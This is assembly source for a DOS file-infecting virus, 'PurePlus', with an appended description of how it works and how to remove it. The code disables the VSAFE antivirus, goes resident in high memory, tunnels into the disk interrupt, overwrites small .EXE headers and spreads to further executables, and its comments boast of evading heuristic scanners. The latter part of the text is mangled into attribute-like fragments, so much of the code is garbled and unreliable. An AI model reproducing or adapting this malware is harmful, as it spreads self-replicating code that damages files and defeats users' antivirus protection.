

cseg            segment para    public  'code'
pureplus        proc    near
assume          cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186

ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
CRITICAL_INT    equ     024h
DENY_NONE       equ     040h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
EIGHTEEN_BYTES  equ     012h
ENVIRONMENT     equ     02ch
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAIL            equ     003h
FAR_INDEX_CALL  equ     01effh
FILENAME_OFFSET equ     0001eh
FILE_OPEN_MODE  equ     002h
FIND_FIRST      equ     04e00h
FIND_NEXT       equ     04f00h
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FOUR_BYTES      equ     004h
GET_DTA         equ     02f00h
GET_ERROR_LEVEL equ     04d00h
HARD_DISK_ONE   equ     081h
HIDDEN          equ     002h
HIGH_BYTE       equ     00100h
HMA_SEGMENT     equ     0ffffh
INT_13_VECTOR   equ     0004ch
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
KEYBOARD_INT	equ	016h
MAX_SECTORS     equ     078h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
NULL            equ     00000h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
PARAMETER_TABLE equ     001f1h
READ_A_SECTOR   equ     00201h
READ_ONLY       equ     001h
READ_W_HANDLE   equ     03f00h
REMOVE_NOP      equ     001h
RESET_CACHE     equ     00001h
RESIZE_MEMORY   equ     04a00h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SIX_BYTES       equ     006h
SMARTDRV        equ     04a10h
SYSTEM          equ     004h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_HEX      equ     020h
TWENTY_THREE    equ     017h
TWO_BYTES       equ     002h
UNINSTALL	equ	05945h
UN_SINGLE_STEP  equ     not(00100h)
VERIFY_3SECTORS equ     00403h
VOLUME_LABEL    equ     008h
VSAFE		equ	0fa01h
WRITE_A_SECTOR  equ     00301h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE
PURE_CODE_IS_AT equ     00147h

;-----------------------------------------------------------------------------

bios_seg        segment at 0f000h	;just some dummy area that was needed
		org     00000h		;to have the compilier make a far jmp
old_int_13_addr label   word		;directive EAh later on
bios_seg        ends

;-----------------------------------------------------------------------------

		org     COM_OFFSET	;com files seem to always start here
com_code:

;-----------------------------------------------------------------------------

		jmp     short disable_vsafe

;-----------------------------------------------------------------------------

dummy_exe_head  dw      SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT
		dw	NULL,NULL,NULL,NULL,NULL,TWENTY_HEX
                			;simple EXE header that we have imbedded the virii into

;-----------------------------------------------------------------------------

		org     PURE_CODE_IS_AT	;here because many exe files have 00's after this location

;-----------------------------------------------------------------------------

ax_cx_di_si_cld proc    near		;sets varables for modifying sector
		mov     di,bx		;ES:BX is int 13 sector set di to bx
		add     di,PURE_CODE_IS_AT-COM_OFFSET
ax_cx_si_cld:   call    set_si		;get location of code in HMA
set_si:         pop     si		;and subtract the offset
		sub     si,word ptr (offset set_si)-word ptr (offset ax_cx_di_si_cld)
		mov     cx,COM_OFFSET+SECTOR_SIZE-PURE_CODE_IS_AT
		mov     ax,XOR_CODE	;ah is value to xor MZ to jmp 015C
		das			;set zero flag for the compare later on
		cld			;clear direction
		ret
ax_cx_di_si_cld endp

;-----------------------------------------------------------------------------

		org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET
					;must be here because the MZ 4Dh,5Ah
					;.EXE header identifier gets changed to
                                        ;jmp 015C EAh,5Ah by changing one byte

;-----------------------------------------------------------------------------

disable_vsafe	proc	near		;while we are here lets allow other virii
                mov	dx,UNINSTALL	;it sure is nice to have a simple
		mov	ax,VSAFE	;call to do this
                int	KEYBOARD_INT
disable_vsafe	endp

;-----------------------------------------------------------------------------

alloc_memory    proc    near		;clear disk buffers so reads are done
		mov     ah,high(FLUSH_BUFFERS)
		int     DOS_INT		;from disk and not from memory
		xor     di,di		;set it to zero
		mov     ds,di		;to set the DS there
		mov     bh,high(SECTOR_SIZE)
		dec     di		;now set it to FFFFh
		mov     ax,ALLOCATE_HMA	;lets see how much memory is available
		int     MULTIPLEX_INT	;in the HMA - ES:DI points to begining
		mov     ax,SMARTDRV	;lets flush smartdrv as well for maximum
		mov     bx,RESET_CACHE	;infection.  it sure is nice to have
		int     MULTIPLEX_INT	;a simple call to do this
		mov     bl,SIX_BYTES	;for setting int 1 to tunnel
		inc     di		;if dos <5.0 or="" no="" hma="" di="" is="" ffffh="" jz="" find_name="" ;if="" no="" memory="" don't="" install="" call="" ax_cx_si_cld="" ;get="" varables="" for="" copy="" to="" hma="" rep="" movs="" byte="" ptr="" es:[di],cs:[si]="" alloc_memory="" endp="" ;then="" copy="" it="" to="" es:di="" in="" hma="" ;-----------------------------------------------------------------------------="" set_int_13="" proc="" near="" ;setting="" int="" 1="" vectors="" for="" tunnelling="" mov="" ax,offset="" interrupt_one="" xchg="" word="" ptr="" ds:[bx-two_bytes],ax="" push="" ax="" ;great="" way="" to="" set="" interrupts="" push="" word="" ptr="" ds:[bx];just="" push="" them="" on="" the="" stack="" for="" latter="" mov="" word="" ptr="" ds:[bx],cs="" xchg="" cx,di="" ;cx="" was="" 0,="" di="" was="" last="" byte="" of="" hma="" code="" mov="" dl,hard_disk_one;doesn't="" really="" matter="" which="" drive="" pushf="" ;save="" the="" flags="" with="" tf="" cleared="" pushf="" ;push="" flags="" for="" simulated="" int="" 13="" call="" pushf="" ;push="" flags="" for="" setting="" tf="" mov="" bp,sp="" ;get="" the="" stack="" pointer="" mov="" ax,verify_3sectors="" or="" byte="" ptr="" ss:[bp+one_byte],al="" popf="" ;set="" tf="" and="" direction="" and="" call="" int="" 13="" dw="" far_index_call,int_13_vector="" popf="" ;restore="" flags="" pop="" word="" ptr="" ds:[bx];and="" int="" 1="" vectors="" back="" pop="" word="" ptr="" ds:[bx-two_bytes]="" set_int_13="" endp="" ;now="" int="" 13="" has="" our="" code="" hooked="" into="" it="" ;-----------------------------------------------------------------------------="" find_name="" proc="" near="" ;now="" lets="" find="" out="" who="" we="" are="" to="" reload="" mov="" ds,word="" ptr="" cs:[bx+environment-six_bytes]="" look_for_nulls:="" inc="" bx="" ;ourselves="" to="" see="" if="" we="" are="" cleaned="" on="" the="" fly="" cmp="" word="" ptr="" ds:[bx-four_bytes],di="" jne="" look_for_nulls="" ;the="" plan="" is="" to="" goto="" the="" end="" of="" our="" find_name="" endp="" ;environment="" and="" look="" for="" 2="" nulls="" ;-----------------------------------------------------------------------------="" open_file="" proc="" near="" ;open="" current="" program="" and="" read="" header="" push="" ds="" ;to="" see="" if="" the="" header="" was="" restored="" back="" push="" bx="" ;save="" the="" program="" name="" on="" the="" stack="" mov="" ch,three_bytes="" ;read="" in="" 768="" bytes="" of="" header="" call="" open_n_read_exe="" ;open,="" read="" cx="" bytes,="" close="" file="" ds:bx="" push="" cs="" ;set="" es="" to="" cs="" for="" compare="" of="" sector="" pop="" es="" ;to="" infected="" sector="" mov="" bx,dx="" ;get="" varables="" set="" correctly="" for="" compare="" call="" convert_back="" ;compare="" them="" and="" convert="" them="" back="" pop="" dx="" ;get="" file="" name="" again="" pop="" ds="" jne="" now_run_it="" ;if="" int="" 13="" converted="" it="" back="" then="" run="" it="" push="" ds="" ;else="" save="" file="" name="" again="" on="" stack="" push="" dx="" mov="" ax,open_w_handle+deny_none+only_read="" call="" call_dos="" ;open="" current="" program="" for="" reads="" (don't="" set="" any="" alarms)="" push="" bx="" ;save="" handle="" int="" multiplex_int="" ;get="" job="" file="" table="" for="" handle="" mov="" dx,sys_file_table="" xchg="" ax,dx="" ;done="" like="" this="" for="" anti="" tbav="" hueristic="" scan="" mov="" bl,byte="" ptr="" es:[di]="" int="" multiplex_int="" ;get="" sft="" of="" handle="" to="" change="" es:di="" pop="" bx="" ;get="" handle="" again="" mov="" ch,high(sector_size)="" mov="" ax,write_w_handle+deny_none+only_write="" cmpsw="" ;simple="" code="" to="" change="" open="" file="" to="" stosb="" ;write="" back="" the="" cleaned="" header="" to="" file="" mov="" dx,offset="" critical_error+com_offset="" int="" dos_int="" ;this="" cleans="" the="" file="" if="" virii="" didn't="" load="" in="" hma="" or="" byte="" ptr="" es:[di+dont_set_offset-three_bytes],dont_set_time="" call="" reclose_it="" ;set="" sft="" to="" not="" change="" file="" date="" and="" time="" at="" close="" pop="" dx="" ;get="" file="" name="" again="" from="" the="" stack="" pop="" ds="" open_file="" endp="" ;-----------------------------------------------------------------------------="" now_run_it="" proc="" near="" ;setup="" the="" exec="" of="" current="" program="" again="" push="" cs="" ;like="" a="" spawned="" file="" pop="" es="" ;es="" now="" cs="" mov="" bx,offset="" exec_table="" mov="" ah,high(resize_memory)="" int="" dos_int="" ;first="" resize="" memory="" mov="" si,offset="" critical_error+com_offset+parameter_table="" xchg="" bx,si="" ;set="" si="" to="" where="" the="" table="" varables="" are="" mov="" di,bx="" ;set="" di="" to="" where="" 14="" byte="" exec="" table="" is="" to="" be="" made="" mov="" ax,exec_program="" ;set="" ax="" for="" file="" execute="" set_table:="" scasw="" ;advance="" 2="" bytes="" in="" destination="" table="" movs="" byte="" ptr="" es:[di],cs:[si]="" scasb="" ;move="" a="" byte="" then="" check="" if="" next="" byte="" is="" nonzero="" mov="" word="" ptr="" cs:[di],cs="" je="" set_table="" ;fill="" in="" the="" code="" segment="" into="" table="" and="" jmp="" if="" still="" zero="" call="" call_dos="" ;exec="" program="" again="" mov="" ax,find_first="" ;need="" to="" infect="" more="" exe="" files="" mov="" dx,offset="" exe_file_mask="" mov="" cx,read_only+hidden+system+volume_label="" find_next_file:="" call="" call_dos="" ;set="" cx="" to="" 15="" to="" loop="" that="" many="" times="" mov="" ah,high(get_dta);what="" was="" the="" old="" dta="" no="" need="" to="" set="" up="" a="" new="" one="" int="" dos_int="" ;get="" it="" add="" bx,filename_offset="" push="" es="" ;get="" the="" filename="" into="" ds:bx="" pop="" ds="" call="" open_n_read_exe="" ;open,="" read="" cx="" bytes,="" close="" file="" ds:bx="" mov="" ah,high(find_next)="" loop="" find_next_file="" ;loop="" until="" no="" more="" matches="" done:="" mov="" ah,high(get_error_level)="" int="" dos_int="" ;get="" spawned="" childs="" program="" errorlevel="" mov="" ah,high(terminate_w_err)="" now_run_it="" endp="" ;and="" return="" with="" that="" same="" errorlevel="" ;-----------------------------------------------------------------------------="" call_dos="" proc="" near="" ;routine="" to="" call="" dos="" int="" dos_int="" ;call="" dos="" jc="" done="" ;error="" in="" doing="" so="" then="" exit="" xchg="" ax,bx="" ;set="" bx="" to="" ax="" for="" open="" file="" stuff="" push="" cs="" ;set="" ds="" to="" cs="" pop="" ds="" ;for="" all="" sorts="" of="" stuff="" mov="" ax,job_file_table="" ret="" ;get="" job="" file="" table="" call_dos="" endp="" ;(done="" here="" for="" anti="" tbav="" hueristic="" scan)="" ;-----------------------------------------------------------------------------="" exec_table="" db="" command_line,first_fcb,second_fcb="" ;these="" are="" used="" to="" create="" the="" 14="" byte="" exec="" ;table="" to="" rerun="" program="" ;-----------------------------------------------------------------------------="" open_n_read_exe="" proc="" near="" ;opens="" file="" at="" ds:bx="" reads="" cx="" bytes="" then="" closes="" mov="" dx,bx="" ;set="" dx="" to="" bx="" for="" dos="" call="" to="" open="" file="" mov="" ax,open_w_handle+deny_none+only_read="" call="" call_dos="" ;just="" open="" it="" for="" reading="" (don't="" sound="" any="" alarms)="" mov="" dx,offset="" critical_error="" mov="" ax,dos_set_int+critical_int="" int="" dos_int="" ;see="" that="" the="" call_dos="" set="" ds="" to="" cs="" for="" setting="" critical="" error="" handler="" inc="" dh="" ;just="" some="" dummy="" area="" outside="" in="" the="" heap="" to="" read="" the="" header="" of="" the="" file="" to="" mov="" ah,high(read_w_handle)="" int="" dos_int="" ;read="" it="" reclose_it:="" mov="" ah,high(close_handle)="" jmp="" short="" call_dos="" ;goto="" close="" it="" open_n_read_exe="" endp="" ;-----------------------------------------------------------------------------="" interrupt_one="" proc="" far="" ;trace="" interrupt="" to="" imbed="" into="" int="" 13="" chain="" at="" ffff:????="" cmp="" ax,verify_3sectors="" jne="" interrupt_ret="" ;if="" not="" doing="" int="" 13="" stuff="" just="" leave="" push="" ds="" ;push="" varables="" on="" stack="" pusha="" mov="" bp,sp="" ;make="" bp="" the="" sp="" lds="" si,dword="" ptr="" ss:[bp+eighteen_bytes]="" cmp="" word="" ptr="" ds:[si+one_byte],far_index_call="" jne="" go_back="" ;compare="" the="" instruction="" to="" a="" far="" call="" function="" mov="" si,word="" ptr="" ds:[si+three_bytes]="" cmp="" word="" ptr="" ds:[si+two_bytes],hma_segment="" jne="" go_back="" ;compare="" the="" address="" of="" the="" call="" to="" segment="" ffffh="" cld="" ;if="" match="" then="" cx="" is="" pointing="" to="" the="" far="" call="" eah="" at="" mov="" di,cx="" ;the="" end="" of="" virii="" that="" needs="" to="" be="" updated="" movsw="" ;move="" the="" address="" to="" our="" code="" movsw="" ;far="" addresses="" are="" 4="" bytes="" long="" sub="" di,word="" ptr="" (offset="" far_ptr_addr)-word="" ptr="" (offset="" int_13_entry)="" org="" $-remove_nop="" ;now="" patch="" in="" our="" code="" into="" the="" call="" chain.="" only="" need="" to="" change="" offset="" because="" segment="" is="" already="" ffffh="" mov="" word="" ptr="" ds:[si-four_bytes],di="" and="" byte="" ptr="" ss:[bp+twenty_three],high(un_single_step)="" go_back:="" popa="" ;no="" longer="" need="" to="" singel="" step="" pop="" ds="" ;pop="" off="" varables="" critical_error:="" mov="" al,fail="" ;set="" al="" to="" fail="" for="" critical="" error="" handler="" (al="" is="" a="" fail="" 03h="" anyway="" from="" above="" code="" ax="" verify_3sectors="" 0403h)="" interrupt_ret:="" iret="" ;dual="" useage="" of="" iret.="" critical="" error="" and="" int="" 1="" interrupt_one="" endp="" ;after="" running="" int="" 1="" routine="" through="" an="" int="" 13="" chain="" we="" should="" be="" hooked="" in="" ;-----------------------------------------------------------------------------="" exe_file_mask="" db="" '*.e*',null="" ;.exe="" file="" mask="" (doesn't="" need="" to="" be="" specific)="" also="" anti="" tbav="" hueristic="" scan="" ;-----------------------------------------------------------------------------="" convert_back="" proc="" near="" ;will="" convert="" virii="" sector="" es:bx="" back="" to="" clean="" sector="" call="" ax_cx_di_si_cld="" ;get="" all="" them="" varables="" repe="" cmps="" byte="" ptr="" cs:[si],es:[di]="" jne="" not_pure="" ;does="" it="" compare="" byte="" for="" byte="" with="" our="" code="" xor="" byte="" ptr="" ds:[bx],ah="" call="" ax_cx_di_si_cld="" ;if="" it="" does="" change="" the="" jmp="" 015c="" to="" an="" mz="" exe="" header="" signature="" rep="" stosb="" ;and="" zero="" out="" all="" the="" code="" not_pure:="" ret="" ;go="" back="" to="" where="" you="" once="" belonged="" convert_back="" endp="" ;-----------------------------------------------------------------------------="" convert_to="" proc="" near="" ;will="" convert="" sector="" ds:bx="" into="" virii="" infected="" pusha="" ;save="" varables="" onto="" stack="" stc="" ;say="" that="" we="" failed="" pushf="" ;push="" failed="" onto="" the="" stack="" mov="" ax,exe_signature;done="" this="" way="" for="" anti="" tbav="" hueristic="" scan="" cmp="" word="" ptr="" ds:[bx],ax="" jne="" not_exe_header="" ;if="" not="" an="" exe="" header="" then="" not="" interested="" mov="" ax,word="" ptr="" ds:[bx+exe_sector_size]="" cmp="" ax,max_sectors="" ;is="" size="" of="" exe="" small="" enough="" to="" run="" as="" a="" com="" file="" ja="" not_exe_header="" ;if="" not="" then="" not="" interested="" cmp="" al,setver_size="" ;was="" the="" file="" the="" length="" of="" setver.exe="" if="" so="" then="" not="" interested="" je="" not_exe_header="" ;(won't="" load="" correctly="" in="" config.sys="" if="" setver.exe="" is="" infected)="" cmp="" word="" ptr="" ds:[bx+new_exe_offset],new_exe_header="" jae="" not_exe_header="" ;was="" it="" a="" new="" exe="" header="" (windows="" etc)="" if="" so="" then="" not="" interested="" call="" ax_cx_di_si_cld="" ;get="" all="" them="" varables="" pusha="" ;save'em="" repe="" scasb="" ;was="" there="" nothin="" but="" 00's="" at="" offset="" 71="" to="" 512="" of="" the="" sector="" popa="" ;get'em="" again="" jne="" not_exe_header="" ;if="" not="" then="" not="" interested="" xor="" byte="" ptr="" ds:[bx],ah="" rep="" movs="" byte="" ptr="" es:[di],cs:[si]="" popf="" ;if="" all="" criteria="" were="" met="" for="" infection="" then="" modify="" sector="" in="" memory="" and="" insert="" virii="" clc="" ;pop="" off="" the="" fail="" indicator="" pushf="" ;and="" push="" on="" the="" passed="" indicator="" not_exe_header:="" popf="" ;get="" passed/failed="" indicator="" popa="" ;get="" varables="" from="" stack="" ret="" ;go="" back="" to="" where="" you="" once="" belonged="" convert_to="" endp="" ;-----------------------------------------------------------------------------="" interrupt_13="" proc="" far="" ;will="" read="" the="" sectors="" at="" es:bx="" and="" infect="" them="" if="" necessary="" and="" or="" clean="" them="" on="" the="" fly="" int_13_entry:="" cmp="" ah,high(read_a_sector)="" jb="" call_old_int_13="" ;only="" interested="" in="" reads,="" writes="" and="" verifys="" cmp="" ah,high(verify_3sectors)="" ja="" call_old_int_13="" ;if="" otherwise="" then="" go="" to="" old="" int="" 13="" push="" ds="" ;save="" ds="" push="" es="" ;so="" we="" can="" make="" ds="" the="" same="" as="" es="" and="" save="" a="" few="" bytes="" pop="" ds="" call="" convert_to="" ;try="" to="" convert="" it="" to="" a="" virii="" sector="" pushf="" ;set="" up="" for="" interrupt="" simulation="" push="" cs="" ;push="" the="" cs="" onto="" the="" stack="" for="" the="" iret="" call="" call_old_int_13="" ;if="" command="" was="" to="" write="" then="" an="" infected="" write="" occured="" else="" memory="" got="" overwritten="" with="" the="" read="" pushf="" ;save="" the="" result="" of="" the="" int="" 13="" call="" call="" convert_to="" ;does="" it="" need="" to="" be="" converted="" to="" a="" virii="" sector="" pusha="" ;save="" the="" varables="" onto="" the="" stack="" jc="" do_convertback="" ;if="" not="" then="" see="" if="" it="" needs="" cleaning="" mov="" ax,write_a_sector="" pushf="" ;now="" lets="" write="" the="" virii="" infected="" sector="" back="" to="" disk="" push="" cs="" ;simulate="" an="" int="" 13="" execution="" call="" call_old_int_13="" ;and="" do="" it="" do_convertback:="" call="" convert_back="" ;does="" the="" sector="" need="" to="" be="" cleaned="" on="" the="" fly="" popa="" ;if="" it="" just="" wrote="" to="" the="" disk="" then="" it="" will="" need="" to="" be="" cleaned="" popf="" ;or="" if="" it="" is="" a="" virii="" infected="" sector="" then="" clean="" it="" pop="" ds="" ;pop="" off="" the="" varables="" and="" the="" result="" of="" int="" 13="" simulation="" done="" above="" retf="" keep_cf_intact="" ;then="" leave="" this="" routine="" with="" the="" carry="" flag="" intact="" interrupt_13="" endp="" ;-----------------------------------------------------------------------------="" signature="" db="" 'q'="" ;must="" leave="" my="" calling="" card="" ;-----------------------------------------------------------------------------="" org="" com_offset+sector_size-one_byte="" ;must="" be="" a="" far="" jmp="" at="" the="" last="" of="" the="" sector="" ;the="" address="" of="" the="" jmp="" is="" in="" the="" heap="" area="" ;and="" is="" filled="" in="" by="" the="" int="" 1="" trace="" routine="" ;-----------------------------------------------------------------------------="" call_old_int_13="" proc="" near="" ;far="" call="" to="" actual="" int="" 13="" that="" is="" loaded="" in="" the="" hma="" by="" dos="" jmp="" far="" ptr="" old_int_13_addr="" call_old_int_13="" endp="" ;-----------------------------------------------------------------------------="" org="" com_offset+sector_size="" ;overwrites="" the="" address="" of="" above="" but="" that="" address="" ;is="" not="" necessary="" until="" the="" virii="" goes="" resident="" in="" the="" hma="" ;-----------------------------------------------------------------------------="" goto_dos="" proc="" near="" ;this="" is="" our="" simple="" exe="" file="" that="" we="" infected="" mov="" ax,terminate_w_err="" nop="" ;it="" just="" simply="" ends="" far_ptr_addr:="" int="" dos_int="" ;terminate="" program="" goto_dos="" endp="" ;-----------------------------------------------------------------------------="" pureplus="" endp="" ;close="" up="" and="" go="" home="" cseg="" ends="" end="" com_code="" ;-----------------------------------------------------------------------------="" virus="" name:="" pureplus="" aliases:="" v="" status:="" new,="" research="" viron="" discovery:="" march,="" 1994="" symptoms:="" none="" -="" pure="" stealth="" origin:="" usa="" eff="" length:="" 441="" bytes="" type="" code:="" oree="" -="" extended="" hma="" memory="" resident="" overwriting="" .exe="" infector="" detection="" method:="" none="" removal="" instructions:="" see="" below="" general="" comments:="" the="" pureplus="" virus="" is="" a="" hma="" memory="" resident="" overwriting="" direct="" action="" infector.="" the="" virus="" is="" a="" pure="" 100%="" stealth="" virus="" with="" no="" detectable="" symptoms.="" no="" file="" length="" increase;="" overwritten="" .exe="" files="" execute="" properly;="" no="" interrupts="" are="" directly="" hooked;="" no="" change="" in="" file="" date="" or="" time;="" no="" change="" in="" available="" memory;="" int="" 12="" is="" not="" moved;="" no="" cross="" linked="" files="" from="" chkdsk;="" when="" resident="" the="" virus="" cleans="" programs="" on="" the="" fly;="" works="" with="" all="" 80?86="" processors;="" vsafe.com="" does="" not="" detect="" any="" changes;="" thunder="" byte's="" heuristic="" virus="" detection="" does="" not="" detect="" the="" virus;="" windows="" 3.1's="" built="" in="" warning="" about="" a="" possible="" virus="" does="" not="" detect="" pureplus.="" the="" pureplus="" is="" a="" variation="" of="" the="" pure="" virus="" that="" will="" cause="" vsafe.com="" to="" uninstall.="" the="" pureplus="" virus="" will="" only="" load="" if="" dos="HIGH" in="" the="" config.sys="" file.="" the="" first="" time="" an="" infected="" .exe="" file="" is="" executed,="" the="" virus="" goes="" memory="" resident="" in="" the="" hma="" (high="" memory="" area).="" the="" hooking="" of="" int="" 13="" is="" accomplished="" using="" a="" tunnelling="" technique,="" so="" memory="" mapping="" utilities="" will="" not="" map="" it="" to="" the="" virus="" in="" memory.="" it="" then="" reloads="" the="" infected="" .exe="" file,="" cleans="" it="" on="" the="" fly,="" then="" executes="" it.="" after="" the="" program="" has="" been="" executed,="" pureplus="" will="" attempt="" to="" infect="" 15="" .exe="" files="" in="" the="" current="" directory.="" if="" the="" pureplus="" virus="" is="" unable="" to="" install="" in="" the="" hma="" or="" clean="" the="" infected="" .exe="" on="" the="" fly,="" the="" virus="" will="" reopen="" the="" infected="" .exe="" file="" for="" read-only;="" modify="" the="" system="" file="" table="" for="" write;="" remove="" itself,="" and="" then="" write="" the="" cleaned="" code="" back="" to="" the="" .exe="" file.="" it="" then="" reloads="" the="" clean="" .exe="" file="" and="" executes="" it.="" the="" virus="" can="" not="" clean="" itself="" on="" the="" fly="" if="" the="" disk="" is="" compressed="" with="" dblspace="" or="" stacker,="" so="" it="" will="" clean="" the="" infected="" .exe="" file="" and="" write="" it="" back.="" it="" will="" also="" clean="" itself="" on="" an="" 8086="" or="" 8088="" processor.="" it="" will="" infect="" an="" .exe="" if="" it="" is="" executed,="" opened="" for="" any="" reason="" or="" even="" copied.="" when="" an="" uninfected="" .exe="" is="" copied,="" both="" the="" source="" and="" destination="" .exe="" file="" are="" infected.="" the="" pureplus="" virus="" overwrites="" the="" .exe="" header="" if="" it="" meets="" certain="" criteria.="" the="" .exe="" file="" must="" be="" less="" than="" 62k.="" the="" file="" does="" not="" have="" an="" extended="" .exe="" header.="" the="" file="" is="" not="" setver.exe.="" the="" .exe="" header="" must="" be="" all="" zeros="" from="" offset="" 71="" to="" offset="" 512;="" this="" is="" where="" the="" pureplus="" virus="" writes="" it="" code.="" the="" pureplus="" virus="" then="" changes="" the="" .exe="" header="" to="" a="" .com="" file.="" files="" that="" are="" readonly="" can="" also="" be="" infected.="" to="" remove="" the="" virus="" from="" your="" system,="" change="" dos="HIGH" to="" dos="LOW" in="" your="" config.sys="" file.="" reboot="" the="" system.="" then="" run="" each="" .exe="" file="" less="" than="" 62k.="" the="" virus="" will="" remove="" itself="" from="" each="" .exe="" program="" when="" it="" is="" executed.="" or,="" leave="" dos="HIGH" in="" you="" config.sys;="" execute="" an="" infected="" .exe="" file,="" then="" use="" a="" tape="" backup="" unit="" to="" copy="" all="" your="" files.="" the="" files="" on="" the="" tape="" have="" had="" the="" virus="" removed="" from="" them.="" change="" dos="HIGH" to="" dos="LOW" in="" your="" config.sys="" file.="" reboot="" the="" system.="" restore="" from="" tape="" all="" the="" files="" back="" to="" your="" system.=""></5.0>